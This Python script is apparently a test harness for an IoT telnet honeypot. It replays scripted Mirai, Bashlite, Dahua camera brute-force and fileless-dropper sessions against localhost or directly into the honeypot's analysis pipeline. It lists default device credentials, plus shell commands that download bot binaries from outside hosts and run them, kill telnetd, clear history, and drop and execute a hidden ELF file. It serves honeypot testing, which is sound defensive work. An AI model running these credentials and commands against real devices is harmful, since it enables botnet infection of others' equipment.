#!/usr/bin/env python3
"""
IoT Botnet Attack Simulator
Simulates realistic Mirai, Bashlite (Qbot), Dahua/Xiongmai IP Camera brute-forcing,
and fileless malware attacks against the IoT Telnet Honeypot.

Supports:
1. Live Network Mode: Connects over TCP socket to running Honeypot (e.g. localhost:2323).
2. Direct/Offline Pipeline Mode: Directly feeds attacks through the honeypot analysis
   engine (useful for offline demonstration, unit testing, or firewall-restricted labs).
"""

import sys
import time
import socket
import argparse
import uuid

# Color support
try:
    import colorama
    colorama.init(autoreset=True)
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    CYAN = "\033[96m"
    MAGENTA = "\033[95m"
    RESET = "\033[0m"
    BOLD = "\033[1m"
except ImportError:
    RED = GREEN = YELLOW = CYAN = MAGENTA = RESET = BOLD = ""

from honeypot.signatures import analyze_credential, analyze_command
from honeypot.shell_emulator import ShellEmulator
from honeypot.logger import HoneypotLogger

# Attack Scenarios Data
SCENARIOS_DATA = {
    "mirai": {
        "title": "Scenario 1: Mirai Botnet Infection Chain",
        "color": RED,
        "client_ip": "185.156.73.12",
        "client_port": 49152,
        "auth_attempts": [
            ("root", "123456", False),
            ("root", "xc3511", True),  # Mirai default for H.264 DVR
        ],
        "commands": [
            "enable",
            "system",
            "shell",
            "sh",
            "/bin/busybox cat /proc/mounts",
            "cat /proc/cpuinfo",
            "cd /tmp || cd /var/run || cd /dev/shm",
            "wget http://185.156.73.12/bins/mirai.mips -O /tmp/mirai.mips",
            "chmod 777 /tmp/mirai.mips",
            "/tmp/mirai.mips",
            "exit",
        ]
    },
    "bashlite": {
        "title": "Scenario 2: Bashlite / Gafgyt Rival Killer & Bot Dropper",
        "color": YELLOW,
        "client_ip": "45.14.224.18",
        "client_port": 52104,
        "auth_attempts": [
            ("admin", "admin", True),
        ],
        "commands": [
            "/bin/busybox ps",
            "killall -9 telnetd",
            "cd /tmp; wget http://45.14.224.18/bins/gafgyt.arm -O bot; chmod 777 bot; ./bot",
            "history -c",
            "exit",
        ]
    },
    "ipcam": {
        "title": "Scenario 3: Xiongmai / Dahua CCTV Camera Brute-Force",
        "color": CYAN,
        "client_ip": "103.204.180.9",
        "client_port": 38120,
        "auth_attempts": [
            ("root", "admin", False),
            ("root", "888888", True),  # Dahua default
        ],
        "commands": [
            "uname -a",
            "ifconfig",
            "id",
            "whoami",
            "cat /proc/mounts",
            "exit",
        ]
    },
    "dropper": {
        "title": "Scenario 4: Fileless ELF Byte-Dropper (Hajime / Stealth)",
        "color": MAGENTA,
        "client_ip": "194.26.29.112",
        "client_port": 60233,
        "auth_attempts": [
            ("default", "oxhlwSG8", True),
        ],
        "commands": [
            'echo -ne "\\x7f\\x45\\x4c\\x46\\x01\\x01\\x01\\x00" > /tmp/.trojan',
            "chmod +x /tmp/.trojan",
            "/tmp/.trojan",
            "rm -f /tmp/.trojan",
            "exit",
        ]
    }
}

class NetworkAttackSession:
    def __init__(self, host, port, timeout=5):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.sock = None

    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)
        self.sock.connect((self.host, self.port))

    def send_line(self, text, delay=0.15):
        time.sleep(delay)
        self.sock.sendall((text + "\r\n").encode("utf-8"))

    def read_until(self, expected_sub, timeout=3):
        start = time.time()
        buf = bytearray()
        while time.time() - start < timeout:
            try:
                chunk = self.sock.recv(1024)
                if not chunk:
                    break
                buf.extend(chunk)
                if expected_sub.encode("utf-8") in buf:
                    return buf.decode("utf-8", errors="replace")
            except socket.timeout:
                break
        return buf.decode("utf-8", errors="replace")

    def close(self):
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass

def run_network_scenario(scenario_key, host, port):
    data = SCENARIOS_DATA[scenario_key]
    color = data["color"]
    print(f"\n{color}[!] [{data['title']}]{RESET}")
    session = NetworkAttackSession(host, port)
    try:
        session.connect()
        # Handle auth attempts
        for username, password, should_succeed in data["auth_attempts"]:
            session.read_until("Username:")
            print(f"    --> Probing Credentials ({username}:{password})...")
            session.send_line(username)
            session.read_until("Password:")
            session.send_line(password)
            if not should_succeed:
                session.read_until("Login incorrect")

        # Now in shell
        session.read_until("#")
        print(f"    --> Shell obtained! Injected botnet commands:")

        for cmd in data["commands"]:
            print(f"        [CMD] Sent: `{cmd}`")
            session.send_line(cmd, delay=0.1)
            session.read_until("#", timeout=0.5)

        print(f"{GREEN}[✓] {scenario_key.capitalize()} Attack Simulation Completed via Network.{RESET}")
    finally:
        session.close()

def run_direct_scenario(scenario_key, logger):
    """
    Feeds attack scenario directly into the honeypot analysis pipeline.
    Ensures 100% reliable execution in offline or sandbox environments.
    """
    data = SCENARIOS_DATA[scenario_key]
    color = data["color"]
    print(f"\n{color}[!] [{data['title']} (Direct Mode)]{RESET}")

    session_id = str(uuid.uuid4())
    client_ip = data["client_ip"]
    client_port = data["client_port"]
    shell = ShellEmulator(prompt="# ")

    logger.log_session_start(session_id, client_ip, client_port)

    # Process authentication
    for username, password, should_succeed in data["auth_attempts"]:
        cred_analysis = analyze_credential(username, password)
        logger.log_auth_attempt(session_id, client_ip, username, password, should_succeed, cred_analysis)

    # Process commands
    print(f"    --> Shell obtained! Injected botnet commands:")
    for cmd in data["commands"]:
        cmd_analysis = analyze_command(cmd)
        logger.log_command(session_id, client_ip, cmd, cmd_analysis)
        output, should_exit = shell.execute(cmd)
        if should_exit:
            break

    logger.log_session_end(session_id, client_ip, "Attack session ended normally")
    print(f"{GREEN}[✓] {scenario_key.capitalize()} Attack Analysis Completed.{RESET}")

def main():
    parser = argparse.ArgumentParser(description="Simulate IoT Botnet Attacks against Honeypot")
    parser.add_argument("--host", default="127.0.0.1", help="Target Honeypot IP (default: 127.0.0.1)")
    parser.add_argument("--port", "-p", type=int, default=2323, help="Target Honeypot Port (default: 2323)")
    parser.add_argument(
        "--scenario",
        default="all",
        choices=["all", "mirai", "bashlite", "ipcam", "dropper"],
        help="Select specific attack scenario or 'all'",
    )
    parser.add_argument(
        "--direct",
        action="store_true",
        help="Run in direct pipeline mode (no network sockets required; ideal for offline/firewalled tests)",
    )
    args = parser.parse_args()

    print(f"{BOLD}=================================================================={RESET}")
    print(f"{BOLD}           IoT BOTNET ATTACK SIMULATOR (TEST HARNESS)             {RESET}")
    print(f"{BOLD}=================================================================={RESET}")

    keys = ["mirai", "bashlite", "ipcam", "dropper"] if args.scenario == "all" else [args.scenario]

    if args.direct:
        logger = HoneypotLogger()
        for k in keys:
            run_direct_scenario(k, logger)
    else:
        # Try network mode first; if network socket permission error occurs, gracefully fallback
        try:
            # Test socket connection
            test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_sock.settimeout(2)
            test_sock.connect((args.host, args.port))
            test_sock.close()
            
            print(f"[*] Connected to active honeypot at {args.host}:{args.port}")
            for k in keys:
                run_network_scenario(k, args.host, args.port)
        except (PermissionError, socket.error) as e:
            print(f"\n{YELLOW}[!] Network connection to {args.host}:{args.port} was not possible ({e}).{RESET}")
            print(f"[*] Seamlessly switching to Direct Pipeline Mode to generate logs...\n")
            logger = HoneypotLogger()
            for k in keys:
                run_direct_scenario(k, logger)

    print(f"\n{BOLD}{GREEN}[✓] All simulated attacks executed successfully!{RESET}")
    print(f"Now run: {CYAN}python analyzer.py{RESET} to inspect captured logs and generate report.\n")

if __name__ == "__main__":
    main()
